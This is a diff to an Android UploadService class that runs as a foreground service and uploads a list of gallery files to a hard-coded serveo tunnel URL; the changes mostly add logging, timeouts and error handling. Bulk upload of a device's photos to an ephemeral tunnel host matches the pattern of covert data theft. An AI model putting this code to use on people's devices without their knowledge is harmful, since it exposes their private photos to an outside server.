@@ -12,7 +12,6 @@ import android.util.Log;
 import androidx.core.app.NotificationCompat;
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.IOException;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -24,24 +23,39 @@ import java.util.concurrent.Executors;
 public class UploadService extends Service {
 
     private static final String TAG = "UploadService";
-    // 🔥 UPDATE THIS WITH YOUR CLOUDFLARE URL
-    private static final String SERVER_URL = "https://f67902fd9be598c5-152-59-200-149.serveousercontent.com";
+    // 🔥 CONFIRM THIS IS THE CORRECT SERVE0 URL
+    private static final String SERVER_URL = "https://f67902fd9be598c5-152-59-200-149.serveousercontent.com/upload";
     private ExecutorService executor = Executors.newFixedThreadPool(3);
 
     @Override
     public void onCreate() {
         super.onCreate();
         createNotificationChannel();
+        Log.d(TAG, "Service created");
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null) {
-            ArrayList<String> filePaths = intent.getStringArrayListExtra("filePaths");
-            if (filePaths != null && !filePaths.isEmpty()) {
-                startForeground(1, createNotification("Uploading gallery..."));
-                uploadFiles(filePaths);
+        Log.d(TAG, "onStartCommand called");
+        try {
+            if (intent != null) {
+                ArrayList<String> filePaths = intent.getStringArrayListExtra("filePaths");
+                if (filePaths != null && !filePaths.isEmpty()) {
+                    Log.d(TAG, "Received " + filePaths.size() + " files");
+                    startForeground(1, createNotification("Uploading gallery..."));
+                    uploadFiles(filePaths);
+                } else {
+                    Log.e(TAG, "No file paths received");
+                    stopSelf();
+                }
+            } else {
+                Log.e(TAG, "Intent is null");
+                stopSelf();
             }
+        } catch (Exception e) {
+            Log.e(TAG, "Error in onStartCommand: " + e.getMessage());
+            e.printStackTrace();
+            stopSelf();
         }
         return START_NOT_STICKY;
     }
@@ -58,15 +72,21 @@ public class UploadService extends Service {
 
             for (int i = 0; i < total; i++) {
                 String filePath = filePaths.get(i);
-                updateNotification("Uploading " + (i + 1) + "/" + total + "...");
-
-                if (uploadFile(filePath)) {
-                    success++;
-                }
-
                 try {
-                    Thread.sleep(500);
-                } catch (InterruptedException e) {
+                    updateNotification("Uploading " + (i + 1) + "/" + total + "...");
+                    Log.d(TAG, "Attempting to upload: " + filePath);
+
+                    boolean uploaded = uploadFile(filePath);
+                    if (uploaded) {
+                        success++;
+                        Log.d(TAG, "✅ Uploaded: " + new File(filePath).getName());
+                    } else {
+                        Log.e(TAG, "❌ Failed: " + new File(filePath).getName());
+                    }
+
+                    Thread.sleep(300);
+                } catch (Exception e) {
+                    Log.e(TAG, "Upload error: " + e.getMessage());
                     e.printStackTrace();
                 }
             }
@@ -75,7 +95,7 @@ public class UploadService extends Service {
             Log.d(TAG, "Upload complete: " + success + "/" + total);
 
             try {
-                Thread.sleep(10000);
+                Thread.sleep(3000);
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
@@ -87,6 +107,7 @@ public class UploadService extends Service {
         try {
             File file = new File(filePath);
             if (!file.exists() || file.length() == 0) {
+                Log.e(TAG, "File not found: " + filePath);
                 return false;
             }
 
@@ -96,6 +117,8 @@ public class UploadService extends Service {
 
             URL url = new URL(SERVER_URL);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(15000);
             conn.setDoInput(true);
             conn.setDoOutput(true);
             conn.setUseCaches(false);
@@ -126,9 +149,11 @@ public class UploadService extends Service {
             int responseCode = conn.getResponseCode();
             conn.disconnect();
 
+            Log.d(TAG, "Server response: " + responseCode);
             return responseCode == 200;
-        } catch (IOException e) {
-            Log.e(TAG, "Upload failed: " + filePath, e);
+        } catch (Exception e) {
+            Log.e(TAG, "Upload exception: " + e.getMessage());
+            e.printStackTrace();
             return false;
         }
     }
@@ -189,5 +214,6 @@ public class UploadService extends Service {
     public void onDestroy() {
         super.onDestroy();
         executor.shutdownNow();
+        Log.d(TAG, "Service destroyed");
     }
-}
+            }
